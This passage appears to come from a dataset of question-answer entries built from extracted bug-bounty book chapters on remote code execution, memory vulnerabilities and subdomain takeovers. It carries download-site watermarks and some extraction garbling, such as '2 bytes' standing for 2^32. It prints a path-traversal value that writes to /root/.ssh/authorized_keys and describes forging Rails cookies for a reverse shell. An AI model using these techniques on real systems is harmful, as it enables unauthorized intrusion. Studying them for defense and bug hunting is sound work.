7450911@qq.com\nRuby on Rails secret_key_base value to a public repository. The\nsecret_key_base helps Rails prevent attackers from manipulating signed\ncookies, and it’s meant to be concealed and never shared. Typically,\nthis value is replaced by the environment variable\nENV['SECRET_KEY_BASE'], which only the server can read. Using the\nsecret_key_base is especially important when a Rails site uses a\ncookiestore to store session information in the cookies (we’ll come\nback to this). Because Algolia committed the value to a public\nrepository, the secret_key_base value is still visible at\nhttps://github.com/algolia/facebook-\nsearch/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-\nafe98573d9aad940bb0f531ea55734f8R12/ but is no longer valid.\nWhen Rails signs a cookie, it appends a signature to the cookie’s\nbase64-encoded value. For example, a cookie and its signature might\nlook like this: BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--\ndc40a55cd52fe32bb3b8. Rails checks the signature after the double\ndashes to ensure the beginning of the cookie hasn’t been altered. This\nis significant when Rails is using the cookiestore, because Rails\nmanages website sessions using cookies and their signatures by\ndefault. Information about a user can be added to the cookie and read\nby the server when the cookie is submitted via an HTTP request.\nBecause the cookie is saved on a person’s computer, Rails signs the\ncookie with the secret to ensure it hasn’t been tampered with. How the\ncookie is read is also important; the Rails cookiestore serializes and\ndeserializes the information stored in the cookie.\nIn computer science, serialization is the process of converting an\nobject or data into a state that allows it to be transferred and\nreconstructed. In this case, Rails converts the session information into\na format that can be stored in a cookie and reread when a user submits\n232\nDownload from www.finelybook.com 7450911@qq.com\nthe cookie during their next HTTP request. After serialization, the\ncookie is read through deserialization. The deserialization process is\ncomplex and beyond the scope of this book. But it can often lead to\nRCEs it is passed untrusted data.\nNOTE\nTo learn more about deserialization, see these two great resources: Matthias\nKaiser’s “Exploiting Deserialization Vulnerabilities in Java” talk at\nhttps://www.youtube.com/watch?v=VviY3O-euVQ/ and Alvaro Muñoz and Alexandr\nMirosh’s “Friday the 13th JSON attacks” talk at https://www.youtube.com/watch?\nv=ZBfBYoK_Wr0/).\nKnowing the Rails secret meant Prins could create his own valid\nserialized objects and send them to the site to be deserialized via a\ncookie. If vulnerable, deserialization would lead to an RCE.\nPrins used a Metasploit Framework exploit called Rails Secret\nDeserialization to escalate this vulnerability into an RCE. The\nMetasploit exploit creates a cookie that invokes a reverse shell if it’s\nsuccessfully deserialized. Prins sent the malicious cookie to Algolia,\nwhich enabled a shell on the vulnerable server. As a proof of concept,\nhe ran the command id, which returned uid=1000(prod) gid=1000(prod)\ngroups=1000(prod). He also created the file hackerone.txt on the server\nto demonstrate the vulnerability.\nTakeaways\nIn this case, Prins used an automated tool to scrape public repositories\nfor sensitive values. By doing the same, you can also discover any\nrepositories using suspicious keywords that might clue you in to\nvulnerabilities. Exploiting deserialization vulnerabilities can be very\ncomplex, but some automated tools exist to make this easier. For\n233\nDownload from www.finelybook.com 7450911@qq.com\nexample, you can use Rapid7’s Rails Secret Deserialization for earlier\nversions of Rails and ysoserial, which is maintained by Chris Frohoff,\nfor Java deserialization vulnerabilities.\nRCE THROUGH SSH\nDifficulty: High\nURL: N/A\nSource: blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/\nDate reported: Fall 2017\nBounty paid: Undisclosed\nWhen a target program gives you a large scope to test, it’s best to\nautomate the discovery of assets, then look for subtle indicators that a\nsite might contain vulnerabilities. This is exactly what Jasmin Landry\ndid in the fall of 2017. He began enumerating subdomains and open\nports on a website by using the tools Sublist3r, Aquatone, and Nmap.\nBecause he had discovered hundreds of possible domains and it was\nimpossible to visit them all, he used the automated tool EyeWitness to\ntake screenshots of each one. This helped him visually identify\ninteresting websites.\nEyeWitness disclosed a content management system that Landry\nfound unfamiliar, looked old, and was open source. Landry guessed\nthe default credentials for the software would be admin:admin. Testing\nthem worked, so he kept digging. The site didn’t have any content, but\nauditing the open source code revealed the application ran as the root\nuser on a server. This is bad practice: the root user can perform any\naction on a site, and if the application is compromised, an attacker\nwould have full permissions on the server. This was another reason for\n234\nDownload from www.finelybook.com 7450911@qq.com\nLandry to keep digging.\nNext, Landry looked for disclosed security issues, or CVEs. The\nsite had none, which was unusual for old, open source software.\nLandry identified a number of less severe issues including XSS,\nCSRF, XXEs, and a local file disclosure (the ability to read arbitrary\nfiles on a server). All of these bugs meant it was likely that an RCE\ncould exist somewhere.\nContinuing his work, Landry noticed an API endpoint that allowed\nusers to update template files. The path was /api/i/services/site/write-\nconfiguration.json?path=/config/sites/test/page/test/config.xml, and it\naccepted XML via a POST body. The ability to write files and the\nability to define their path are two significant red flags. If Landry\ncould write files anywhere and have the server interpret them as\napplication files, he could execute whatever code he wanted on the\nserver and possibly invoke system calls. To test this, he changed the\npath to ../../../../../../../../../../../../tmp/test.txt. The symbols ../ are\nreferences to the previous directory in the current path. So if the path\nwas /api/i/services, ../ would be /api/i. This allowed Landry to write in\nany folder he wanted.\nUploading his own file worked, but the application configuration\ndidn’t allow him to execute code, so he needed to find an alternative\nroute to an RCE. It occurred to him that a Secure Socket Shell (SSH)\ncan use public SSH keys to authenticate users. SSH access is the\ntypical way to administer a remote server: it logs into the command\nline via the secure connection established by validating public keys on\nthe remote host in the .ssh/authorized_keys directory. If he was able to\nwrite to the directory and upload his own SSH public key, the site\nwould authenticate him as the root user with direct SSH access and\nfull permissions on the server.\n235\nDownload from www.finelybook.com 7450911@qq.com\nHe tested this and was able to write to\n../../../../../../../../../../../../root/.ssh/authorized_keys. Attempting to use\nSSH to get into the server worked and running the id command\nconfirmed he was root uid=0(root) gid=0(root) groups=0(root).\nTakeaways\nEnumerating subdomains when you’re searching for bugs in a large\nscope is important because it gives you more surface area to test.\nLandry was able to use automated tools to discover a suspicious\ntarget, and confirming a few initial vulnerabilities indicated there\ncould be more to find. Most notably, when his initial attempt at a file\nupload RCE failed, Landry reconsidered his approach. He recognized\nthat he could exploit the SSH configuration rather than just report the\narbitrary file writing vulnerability by itself. Submitting a\ncomprehensive report that fully demonstrates impact usually increases\nthe bounty amount you’re awarded. So don’t stop immediately once\nyou’ve found something—keep digging.\nSUMMARY\nRCE, like a lot of other vulnerabilities discussed in this book, usually\noccurs when user input isn’t properly sanitized before use. In the first\nbug report, ImageMagick wasn’t properly escaping content before\npassing it to system commands. To find this bug, Sadeghipour first re-\ncreated the vulnerability on his own server and then went searching\nfor unpatched servers. In contrast, Prins discovered a secret that\nallowed him to forge signed cookies. Lastly, Landry found a way to\nwrite arbitrary files on a server and used that to overwrite SSH keys so\nhe could log in as root. All three used different methods to obtain\n236\nDownload from www.finelybook.com 7450911@qq.com\nRCE, but each took advantage of the site accepting unsanitized input.\n237"
  },
  {
    "input": "What are memory vulnerabilities, and how do buffer overflows and read out of bounds vulnerabilities specifically allow attackers to exploit applications?",
    "summary": "Memory vulnerabilities occur when an application's memory management has bugs, allowing attackers to inject and execute their own code. These vulnerabilities are common in languages like C and C++ where developers manually manage memory, but less so in languages like Ruby, Python, and Java that handle memory automatically. Examples include buffer overflows, where too much data is written into a memory buffer, and read out of bounds, where data is read beyond a memory boundary, potentially leaking sensitive information. Both types of vulnerabilities can be difficult to detect but are often found in functions that handle memory copying or allocation.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n13\nMEMORY VULNERABILITIES\nEvery application relies on computer memory to store and execute the\napplication’s code. A memory vulnerability exploits a bug in the\napplication’s memory management. The attack results in unintended\nbehavior that could enable an attacker to inject and execute their own\ncommands.\nMemory vulnerabilities occur in programming languages where\ndevelopers are responsible for applications’ memory management,\nsuch as in C and C++. Other languages, like Ruby, Python, PHP, and\nJava, manage memory allocation for developers, making these\nlanguages less susceptible to memory bugs.\nBefore performing any dynamic action in C or C++, a developer\nmust ensure that the proper amount of memory is allocated for the\naction. For example, suppose you’re coding a dynamic banking\napplication that allows users to import transactions. When the\napplication runs, you have no idea how many transactions users will\nimport. Some could import one, and others might import a thousand.\nIn languages without memory management, you must check the\nnumber of transactions being imported and then allocate the\n238\nDownload from www.finelybook.com 7450911@qq.com\nappropriate memory for them. When a developer doesn’t take into\naccount how much memory they need for an application, bugs such as\nbuffer overflows can occur.\nFinding and exploiting memory vulnerabilities is complex, and\nentire books have been written on the subject. For this reason, this\nchapter only provides an introduction to the topic by covering just two\nof the many memory vulnerabilities: buffer overflows and read out of\nbounds vulnerabilities. If you’re interested in learning more, I\nrecommend reading Hacking: The Art of Exploitation by Jon Erickson\nor A Bug Hunter’s Diary: A Guided Tour Through the Wilds of\nSoftware Security by Tobias Klein; both are available from No Starch\nPress.\nBUFFER OVERFLOWS\nA buffer overflow vulnerability is a bug where an application writes\ndata that is too big for the memory (the buffer) allocated for that data.\nBuffer overflows lead to unpredictable program behavior at best and\nserious vulnerabilities at worst. When an attacker can control the\noverflow to execute their own code, they can potentially compromise\nthe application or, depending on user permissions, even the server.\nThis type of vulnerability is similar to the RCE examples in Chapter\n12.\nBuffer overflows usually occur when a developer forgets to check\nthe size of the data being written to a variable. They can also occur\nwhen a developer makes a mistake calculating how much memory the\ndata requires. Because these errors can happen any number of ways,\nwe’ll just examine one type—a length check omission. In the C\nprogramming language, omitted length checks commonly involve\n239\nDownload from www.finelybook.com 7450911@qq.com\nfunctions that alter memory, such as strcpy() and memcpy(). But these\nchecks can also occur when developers use memory allocation\nfunctions, such as malloc() or calloc(). The function strcpy() (and\nmemcpy()) takes two parameters: a buffer to copy data to and the data\nto copy. Here’s an example in C:\n#include <string.h>\nint main()\n{\n➊ char src[16]=\"hello world\";\n➋ char dest[16];\n➌ strcpy(dest, src);\n➍ printf(\"src is %s\\n\", src);\nprintf(\"dest is %s\\n\", dest);\nreturn 0;\n}\nIn this example, the string src ➊ is set to the string \"hello world\",\nwhich is 11 characters long, including the space. This code allocates\n16 bytes to src and dest ➋ (each character is 1 byte). Because each\ncharacter requires 1 byte of memory and strings must end with a null\nbyte (\\0), the \"hello world\" string requires a total of 12 bytes, which fit\nwithin the 16-byte allocation. The strcpy() function then takes the string\nin src and copies it into dest ➌. The printf statements at ➍ print the\nfollowing:\nsrc is hello world\ndest is hello world\nThis code works as expected, but what if someone wanted to really\nemphasize that greeting? Consider this example:\n#include <string.h>\n#include <stdio.h>\n240\nDownload from www.finelybook.com 7450911@qq.com\nint main()\n{\n➊ char src[17]=\"hello world!!!!!\";\n➋ char dest[16];\n➌ strcpy(dest, src);\nprintf(\"src is %s\\n\", src);\nprintf(\"dest is %s\\n\", dest);\nreturn 0;\n}\nHere, five exclamation marks are added, bringing the total\ncharacter count of the string up to 16. The developer remembered that\nall strings must end with a null byte (\\0) in C. They’ve allocated 17\nbytes to src ➊ but forgot to do the same for dest ➋. After compiling\nand running the program, the developer would see this output:\nsrc is\ndest is hello world!!!!!\nThe src variable is empty despite being assigned 'hello world!!!!!'.\nThis happens because of how C allocates stack memory. Stack\nmemory addresses are assigned incrementally, so a variable defined\nearlier in the program will have a lower memory address than a\nvariable defined after it. In this case, src is added to the memory stack,\nfollowed by dest. When the overflow occurs, the 17 characters for 'hello\nworld!!!!!!' are written to the dest variable, but the string’s null byte (\\0)\noverflows into the first character of the src variable. Because null bytes\ndenote the end of a string, src appears to be empty.\nFigure 13-1 illustrates what the stack looks like as each line of\ncode executes from ➊ to ➌.\n241\nDownload from www.finelybook.com 7450911@qq.com\nFigure 13-1: How memory overflows from dest to src\nIn Figure 13-1, src is added to the stack and 17 bytes are allocated\nto the variable, which are labeled in the figure starting from 0 ➊.\nNext, dest is added to the stack but is only allocated 16 bytes ➋. When\nsrc is copied to dest, the last byte that would have been stored in dest\noverflows into the first byte of src (byte 0) ➌. This makes the first\nbyte of src into a null byte.\nIf you added another exclamation mark to src and updated the\nlength to 18, the output would look like this:\nsrc is !\n242\nDownload from www.finelybook.com 7450911@qq.com\ndest is hello world!!!!!\nThe dest variable would only hold 'hello world!!!!!', and the final\nexclamation mark and null byte would overflow into src. This would\nmake src appear as though it only held the string '!'. The memory\nshown in Figure 13-1 ➌ would change to look like Figure 13-2.\nFigure 13-2: Two characters overflow from dest to src\nBut what if the developer forgot about the null byte and used the\nexact length of the string, as follows?\n#include <string.h>\n#include <stdio.h>\nint main ()\n{\nchar ➊src [12]=\"hello world!\";\nchar ➋dest[12];\nstrcpy(dest, src);\nprintf(\"src is %s\\n\", src);\nprintf(\"dest is %s\\n\", dest);\nreturn 0;\n}\nThe developer counts the number of characters in the string\nwithout the null byte and allocates 12 bytes for the src and dest strings\nat ➊ and ➋. The rest of the program copies the src string into dest and\nprints the results, as the previous programs did. Let’s say the\ndeveloper runs this code on their 64-bit processor.\n243\nDownload from www.finelybook.com 7450911@qq.com\nBecause the null byte overflowed from dest in the previous\nexamples, you might expect that src would become an empty string.\nBut the program’s output would be the following:\nsrc is hello world!\ndest is hello world!\nOn modern 64-bit processors, this code would not cause\nunexpected behavior or a buffer overflow. The minimum memory\nallocation on 64-bit machines is 16 bytes (because of memory\nalignment design, which is beyond the scope of this book). On 32-bit\nsystems, it’s 8 bytes. Because hello world! requires only 13 bytes,\nincluding the null byte, it doesn’t overflow the minimum 16 bytes\nallocated to the dest variable.\nREAD OUT OF BOUNDS\nIn contrast, the read out of bounds vulnerability can allow attackers to\nread data outside a memory boundary. This vulnerability occurs when\nan application reads too much memory for a given variable or action.\nReading out of bounds might leak sensitive information.\nA famous read out of bounds vulnerability is the OpenSSL\nHeartbleed bug, which was disclosed in April 2014. OpenSSL is a\nsoftware library that allows application servers to securely\ncommunicate over networks without fear of eavesdroppers. Through\nOpenSSL, applications can identify the server at the other end of the\ncommunication. Heartbleed allowed attackers to read arbitrary data\nduring communications, such as server private keys, session data,\npasswords, and so on, through OpenSSL’s server identification\nprocess.\n244\nDownload from www.finelybook.com 7450911@qq.com\nThe vulnerability makes use of OpenSSL’s heartbeat request\nfunctionality, which sends a message to a server. The server then\nreturns the same message to the requester to verify that both servers\nare in communication. Heartbeat requests might include a length\nparameter, which is the factor that led to the vulnerability. Vulnerable\nversions of OpenSSL allocated memory for the server’s return\nmessage based on the length parameter sent with the request rather\nthan the actual size of the message to be echoed back.\nAs a result, an attacker could exploit Heartbleed by sending a\nheartbeat request with a large length parameter. Let’s say a message\nwas 100 bytes, and an attacker sent 1,000 bytes as the length of the\nmessage. Any vulnerable servers the attacker sent the message to\nwould read the 100 bytes of the intended message and an additional\n900 bytes of arbitrary memory. The information included in the\narbitrary data depends on the vulnerable server’s running processes\nand memory layout at the time of the request processing.\nPHP FTP_GENLIST() INTEGER\nOVERFLOW\nDifficulty: High\nURL: N/A\nSource: https://bugs.php.net/bug.php?id=69545/\nDate reported: April 28, 2015\nBounty paid: $500\nLanguages that manage memory for developers are not immune to\nmemory vulnerabilities. Although PHP automatically manages\nmemory, the language is written in C, which does require memory\n245\nDownload from www.finelybook.com 7450911@qq.com\nmanagement. As a result, built-in PHP functions could be vulnerable\nto memory vulnerabilities. Such was the case when Max Spelsberg\ndiscovered a buffer overflow in PHP’s FTP extension.\nPHP’s FTP extension reads incoming data, such as files, to track\nthe size and number of lines received in the ftp_genlist() function.\nVariables for size and lines were initialized as unsigned integers. On a\n32-bit machine, unsigned integers have a maximum memory\n32\nallocation of 2 bytes (4,294,967,295 bytes or 4GB). So if an attacker\n32\nsent more than 2 bytes, the buffers would overflow.\nAs part of his proof of concept, Spelsberg provided the PHP code\nto start an FTP server and Python code to connect to it. Once the\n32\nconnection was made, his Python client sent 2 + 1 bytes over the\nsocket connection to the FTP server. The PHP FTP server crashed\nbecause Spelsberg had overridden memory, similar to what happened\nin the previously discussed buffer overflow example.\nTakeaways\nBuffer overflows are a well-known and well-documented vulnerability\ntype, but you can still find them in applications that manage their own\nmemory. Even if an application you’re testing isn’t coded in C or\nC++, you might still discover a buffer overflow if the application is\ncoded in a language that is written in another language vulnerable to\nmemory management bugs. In those cases, look for places where\nvariable length checks have been omitted.\nPYTHON HOTSHOT MODULE\nDifficulty: High\nURL: N/A\n246\nDownload from www.finelybook.com 7450911@qq.com\nSource: http://bugs.python.org/issue24481\nDate reported: June 20, 2015\nBounty paid: $500\nLike PHP, the Python programming language is traditionally written\nin C. In fact, sometimes it’s referred to as CPython (Python versions\nwritten in other languages, including Jython, PyPy, and so on, also\nexist). The Python hotshot module is a replacement for the existing\nPython profile module. The hotshot module describes how often and\nfor how long various parts of a program execute. Hotshot is written in\nC, so it has a smaller performance impact than the existing profile\nmodule. But in June 2015, John Leitch discovered a buffer overflow\nin the code that allowed an attacker to copy a string from one memory\nlocation to another.\nThe vulnerable code called the method memcpy(), which copies a\nspecified number of bytes of memory from one location to another.\nFor example, the vulnerable code could have looked like the\nfollowing:\nmemcpy(self->buffer + self->index, s, len);\nThe memcpy() method takes three parameters: a destination, a\nsource, and the number of bytes to copy. In this example, those values\nare the variables self->buffer + self->index (the sum of the buffer and\nindex lengths), s, and len, respectively.\nThe self->buffer destination variable would always have a fixed\nlength. But s, the source variable, could be any length. This meant that\nwhen executing the copy function, memcpy() wouldn’t validate the size\nof the buffer it was writing to. An attacker could pass the function a\nstring longer than the number of bytes allocated to copy. The string\n247\nDownload from www.finelybook.com 7450911@qq.com\nwould be written to the destination and overflow, so it would continue\nwriting past the intended buffer and into other memory.\nTakeaways\nOne method of finding buffer overflows is to look for the functions\nstrcpy() and memcpy(). If you find these functions, validate that they\nhave proper buffer length checks. You’ll need to work backward from\ncode that you find to confirm you can control the source and\ndestination to overflow the allocated memory.\nLIBCURL READ OUT OF BOUNDS\nDifficulty: High\nURL: N/A\nSource: http://curl.haxx.se/docs/adv_20141105.html\nDate reported: November 5, 2014\nBounty paid: $1,000\nLibcurl is a free, client-side URL transfer library that the cURL\ncommand line tool uses to transfer data. Symeon Paraschoudis\ndiscovered a vulnerability in the libcurl curl_easy_duphandle function\nthat could have been exploited to exfiltrate sensitive data.\nWhen performing a transfer with libcurl, you can pass data to send\nwith a POST request using the CURLOPT_POSTFIELDS flag. But\nperforming this action doesn’t guarantee the data will be preserved\nduring the action. To ensure the data is not changed while it’s sent\nwith the POST request, another flag, CURLOPT_COPYPOSTFIELDS,\ncopies the data’s contents and sends the copy with the POST request.\nThe memory area’s size is set through another variable named\n248\nDownload from www.finelybook.com 7450911@qq.com\nCURLOPT_POSTFIELDSIZE.\nTo copy the data, cURL would allocate memory. But the internal\nlibcurl function that duplicated the data had two problems: first,\ncopying the POST data incorrectly would cause libcurl to treat the\nPOST data buffer as a C string. Libcurl would assume the POST data\nended with a null byte. When the data didn’t, libcurl would continue\nreading the string beyond the allocated memory until it found a null\nbyte. This could result in libcurl copying a string that was too small (if\na null byte was included in the middle of the POST body), too large, or\nmight crash the application. Second, after duplicating the data, libcurl\ndidn’t update where it was supposed to read the data from. This was\nan issue: between the time libcurl duplicated the data and read from\nthe data, the memory could have been cleared or reused for other\npurposes. If either of these events happened, the location could have\ncontained data not mean to be sent.\nTakeaways\nThe cURL tool is a very popular and stable library for transferring\ndata over networks. Despite its popularity, it still has bugs. Any\nfunctionality involved in copying memory is a great place to begin\nlooking for memory bugs. Like the other memory examples, read out\nof bounds vulnerabilities are tough to discover. But if you start by\nsearching for commonly vulnerable functions, you’ll be more likely to\nfind a bug.\nSUMMARY\nMemory vulnerabilities can allow attackers to read leaked data or run\ntheir own code, but these vulnerabilities are difficult to find. Modern\n249\nDownload from www.finelybook.com 7450911@qq.com\nprogramming languages are less susceptible to memory vulnerabilities\nbecause they handle their own memory allocation. But applications\nwritten in languages that require the developer to allocate memory are\nstill susceptible to memory bugs. To discover memory vulnerabilities,\nyou need knowledge of memory management, which can be complex\nand might even depend on hardware. If you want to search for these\ntypes of exploits, I recommend you also read other books dedicated\nentirely to the topic.\n250"
  },
  {
    "input": "What is a subdomain takeover vulnerability and how can it be exploited?",
    "summary": "A subdomain takeover occurs when a malicious attacker gains control of a subdomain by exploiting unclaimed DNS records pointing to third-party services. This can lead to serving malicious content or intercepting traffic, as seen in cases involving Heroku, Zendesk, and SendGrid. Vulnerabilities often arise when companies fail to update DNS records after removing subdomains, and tools like KnockPy and crt.sh can help identify these issues. It's important to check third-party service configurations and documentation to find and report subdomain takeovers responsibly.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n14\nSUBDOMAIN TAKEOVER\nA subdomain takeover vulnerability occurs when a malicious attacker\nis able to claim a subdomain from a legitimate site. Once the attacker\ncontrols the subdomain, they either serve their own content or\nintercept traffic.\nUNDERSTANDING DOMAIN NAMES\nTo understand how a subdomain takeover vulnerability works, we’ll\nfirst need to look at how you register and use domain names. Domains\nare the URLs that access websites, and they’re mapped to IP addresses\nby Domain Name Servers (DNS). Domains are organized as a\nhierarchy, and each part is separated by a period. The final part of a\ndomain—the rightmost part—is a top-level domain. Examples of top-\nlevel domains include .com, .ca, .info, and so on. The next level up in\nthe domain hierarchy is the domain name that people or companies\nregister. This part of the hierarchy accesses websites. For example,\nlet’s say <example>.com is a registered domain with a .com top-level\ndomain. The next step in the hierarchy is the focus of this chapter:\n251\nDownload from www.finelybook.com 7450911@qq.com\nsubdomains. Subdomains comprise the leftmost part of URLs and can\nhost separate websites on the same registered domain. For example, if\nExample Company had a customer-facing website but also needed a\nseparate email website, it could have separate www.<example>.com\nand webmail.<example>.com subdomains. Each of these subdomains\ncould serve its own site content.\nSite owners can create subdomains using several methods, but the\ntwo most common methods are adding an A record or a CNAME\nrecord in a site’s DNS records. An A record maps a site name to one\nor more IP addresses. A CNAME should be a unique record that maps\na site name to another site name. Only site administrators can create\nDNS records for a site (unless you find a vulnerability, of course).\nHOW SUBDOMAIN TAKEOVERS WORK\nA subdomain takeover occurs when a user can control the IP\naddresses or URLs that an A record or a CNAME record points to. A\ncommon example of this vulnerability involves the website hosting\nplatform Heroku. In a typical workflow, a site developer creates a new\napplication and hosts it on Heroku. Then the developer creates a\nCNAME record for a subdomain of their main site and points that\nsubdomain to Heroku. Here’s a hypothetical example where this\nsituation can go wrong:\n1. Example Company registers an account on the Heroku platform and\ndoesn’t use SSL.\n2. Heroku assigns Example Company the subdomain\nunicorn457.herokuapp.com for its new application.\n3. Example Company creates a CNAME record with its DNS provider\npointing the subdomain test.<example>.com to\nunicorn457.herokuapp.com.\n252\nDownload from www.finelybook.com 7450911@qq.com\n4. After a couple of months, Example Company decides to remove its test.\n<example>.com subdomain. It closes its Heroku account and deletes the\nsite content from its servers. But it doesn’t delete the CNAME record.\n5. A malicious person notices the CNAME record pointing to an\nunregistered URL on Heroku and claims the domain\nunicorn457.heroku.com.\n6. The attacker can now serve their own content from test.<example>.com,\nwhich appears to be a legitimate Example Company site because of the\nURL.\nAs you can see, this vulnerability often occurs when a site doesn’t\ndelete a CNAME (or an A record) pointing to an external site that an\nattacker can claim. Commonly used external services that have been\nassociated with subdomain takeovers include Zendesk, Heroku,\nGitHub, Amazon S3, and SendGrid.\nThe impact of a subdomain takeover depends on the configuration\nof the subdomain and parent domain. For example, in “Web Hacking\nPro Tips #8” (https://www.youtube.com/watch?v=76TIDwaxtyk),\nArne Swinnen describes how cookies can be scoped so browsers send\nstored cookies to only the appropriate domain. But a cookie can be\nscoped so browsers send cookies to all subdomains by specifying the\nsubdomain only as a period, such as in the value .<example>.com.\nWhen a site has this configuration, browsers will send\n<example>.com cookies to any Example Company subdomain a user\nvisits. If an attacker controls test.<example>.com, they could steal\n<example>.com cookies from targets who visit the malicious test.\n<example>.com subdomain.\nAlternatively, if the cookies aren’t scoped this way, a malicious\nattacker could still create a site on the subdomain that mimics the\nparent domain. If the attacker includes a login page on the subdomain,\n253\nDownload from www.finelybook.com 7450911@qq.com\nthey could potentially phish users into submitting their credentials.\nTwo common attacks are made possible by subdomain takeovers. But\nin the following examples, we’ll also look at other attacks, such as\nemail intercepts.\nFinding subdomain takeover vulnerabilities involves looking up\nthe DNS records for a site. A great way to do this is to use the\nKnockPy tool, which enumerates subdomains and searches for\ncommon subdomain takeover related error messages from services\nlike S3. KnockPy comes with a list of common subdomains to test, but\nyou can also provide your own list of subdomains. The GitHub\nrepository SecLists (https://github.com/danielmiessler/SecLists/) also\nlists commonly found subdomains among its many other security-\nrelated lists.\nUBIQUITI SUBDOMAIN TAKEOVER\nDifficulty: Low\nURL: http://assets.goubiquiti.com/\nSource: https://hackerone.com/reports/109699/\nDate reported: January 10, 2016\nBounty paid: $500\nAmazon Simple Storage, or S3, is a file hosting service provided by\nAmazon Web Services (AWS). An account on S3 is a bucket that you\ncan access using a special AWS URL, which begins with the bucket\nname. Amazon uses a global namespace for its bucket URLs, which\nmeans that once someone registers a bucket, no one else can register\nit. For example, if I registered the bucket <example>, it would have\nthe URL <example>.s3.amazonaws.com and I would own it. Amazon\n254\nDownload from www.finelybook.com 7450911@qq.com\nalso allows users to register any name they want as long as it hasn’t\nalready been claimed, meaning an attacker can claim any unregistered\nS3 bucket.\nIn this report, Ubiquiti created a CNAME record for\nassets.goubiquiti.com and pointed it to the S3 bucket uwn-images.\nThis bucket was accessible via the URL uwn-images.s3.website.us-\nwest-1.amazonaws.com. Because Amazon has servers around the\nworld, the URL includes information about the Amazon geographical\nregion where the bucket is located. In this case, us-west-1 is Northern\nCalifornia.\nBut Ubiquiti either hadn’t registered the bucket or had removed it\nfrom its AWS account without deleting the CNAME record. So,\nvisiting assets.goubiquiti.com would still attempt to serve content\nfrom S3. As a result, a hacker claimed the S3 bucket and reported the\nvulnerability to Ubiquiti.\nTakeaways\nKeep an eye out for DNS entries that point to third-party services like\nS3. When you find such entries, confirm whether the company has\nproperly configured that service. In addition to doing an initial check\non a website’s DNS records, you can continually monitor entries and\nservices using automated tools like KnockPy. It’s best to do so just in\ncase a company removes a subdomain but forgets to update its DNS\nrecords.\nSCAN.ME POINTING TO ZENDESK\nDifficulty: Low\nURL: http://support.scan.me/\n255\nDownload from www.finelybook.com 7450911@qq.com\nSource: https://hackerone.com/reports/114134/\nDate reported: February 2, 2016\nBounty paid: $1,000\nThe Zendesk platform offers customer support service on a website’s\nsubdomain. For instance, if Example Company used Zendesk, its\nassociated subdomain might be support.<example>.com.\nSimilar to the previous Ubiquiti example, owners of the site\nscan.me created a CNAME record pointing support.scan.me to\nscan.zendesk.com. Later, Snapchat acquired scan.me. Close to the\ntime of acquisition, support.scan.me released the subdomain on\nZendesk but forgot to delete the CNAME record. The hacker\nharry_mg found the subdomain, claimed scan.zendesk.com, and\nserved his own content from Zendesk on it.\nTakeaways\nKeep an eye out for company acquisitions that can change how a\ncompany provides services. As optimizations take place between the\nparent company and the acquisition, some subdomains might be\ndeleted. Such changes could result in subdomain takeovers if\ncompanies don’t update DNS entries. Again, because subdomains can\nchange at any time, it’s best to continually check records over time\nafter a company announces an acquisition.\nSHOPIFY WINDSOR SUBDOMAIN\nTAKEOVER\nDifficulty: Low\nURL: http://windsor.shopify.com/\n256\nDownload from www.finelybook.com 7450911@qq.com\nSource: https://hackerone.com/reports/150374/\nDate reported: July 10, 2016\nBounty paid: $500\nNot all subdomain takeovers involve registering an account on a third-\nparty service. In July 2016, the hacker zseano found that Shopify had\ncreated a CNAME for windsor.shopify.com that pointed to\naislingofwindsor.com. He discovered this by searching for all Shopify\nsubdomains on the site crt.sh, which tracks all SSL certificates\nregistered by a site and the subdomains the certificates are associated\nwith. This information is available because all SSL certificates must\nregister with a certificate authority for browsers to confirm the\ncertificate’s authenticity when you visit their sites. The site crt.sh\ntracks these registrations over time and makes the information\navailable to visitors. Sites can also register wildcard certificates,\nwhich provide SSL protections to any subdomain of the site. On\ncrt.sh, this is denoted by an asterisk in the place of the subdomain.\nWhen a site registers a wildcard certificate, crt.sh can’t identify the\nsubdomains where the certificate is used, but each certificate includes\na unique hash value. Another site, censys.io, tracks certificate hashes\nand the subdomains they’re used on by scanning the internet.\nSearching censys.io for a wildcard certificate hash might allow you to\nidentify new subdomains.\nBy browsing through the list of subdomains on crt.sh and visiting\neach, zseano noticed that windsor.shopify.com was returning a 404\npage not found error. This meant Shopify was either serving no\ncontent from the subdomain or it no longer owned\naislingofwindsor.com. Testing the latter, zseano visited a domain\nregistration site, searched for aislingofwindsor.com, and found he\n257\nDownload from www.finelybook.com 7450911@qq.com\ncould buy it for $10. He did and reported the vulnerability to Shopify\nas a subdomain takeover.\nTakeaways\nNot all subdomains involve the use of third-party services. If you find\na subdomain that is pointed to another domain and is returning a 404\npage, check whether you can register that domain. The site crt.sh\nprovides a great reference of SSL certificates registered by sites as an\ninitial step to identifying subdomains. If wildcard certificates have\nbeen registered on crt.sh, search for the certificate hash on censys.io.\nSNAPCHAT FASTLY TAKEOVER\nDifficulty: Medium\nURL: http://fastly.sc-cdn.net/takeover.html\nSource: https://hackerone.com/reports/154425/\nDate reported: July 27, 2016\nBounty paid: $3,000\nFastly is a content delivery network (CDN). A CDN stores copies of\ncontent on servers across the world so content can be delivered in a\nshorter time and distance for users requesting it.\nOn July 27, 2016, the hacker Ebrietas reported to Snapchat that it\nhad a DNS misconfiguration on its domain sc-cdn.net. The URL\nhttp://fastly.sc-cdn.net had a CNAME record that pointed to a Fastly\nsubdomain that Snapchat had not properly claimed. At the time, Fastly\nallowed users to register custom subdomains if users were encrypting\ntheir traffic with Transport Layer Security (TLS) and using the Fastly\nshared wildcard certificate to do so. Misconfiguring the custom\n258\nDownload from www.finelybook.com 7450911@qq.com\nsubdomain resulted in an error message on the domain that read\n“Fastly error: unknown domain: <misconfigured domain>. Please\ncheck that this domain has been added to a service.”\nBefore reporting the bug, Ebrietas looked up the domain sc-cdn.net\non censys.io and confirmed Snapchat’s ownership of the domain by\nusing the registration information on the domain’s SSL certificate.\nThis is significant because the domain sc-cdn.net doesn’t explicitly\ninclude any identifying information about Snapchat the way\nsnapchat.com does. He also configured a server to receive traffic from\nthe URL to confirm the domain was actually in use.\nWhen resolving the report, Snapchat confirmed that a very small\nsubset of users were using an old version of their app, which made\nrequests to this subdomain for unauthenticated content. The users’\nconfiguration was later refreshed and pointed to another URL. In\ntheory, an attacker could have served malicious files to users for that\nlimited amount of 